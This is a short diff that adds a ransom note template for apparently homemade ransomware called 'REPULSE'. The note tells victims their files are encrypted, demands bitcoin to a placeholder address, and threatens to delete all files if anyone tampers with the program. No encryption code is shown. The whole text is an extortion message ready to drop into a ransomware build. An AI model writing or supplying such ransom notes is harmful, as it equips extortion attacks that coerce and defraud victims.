@@ -1,0 +1,5 @@
+Your files have been encrypted by REPULSE™ Ransomware! Pay money to the following bitcoin address to decrypt them:
+
+%BTC_ADDRESS%
+
+Do NOT try and tamper with the ransomware program or remove your files. If tampering is detected, all files will be deleted!
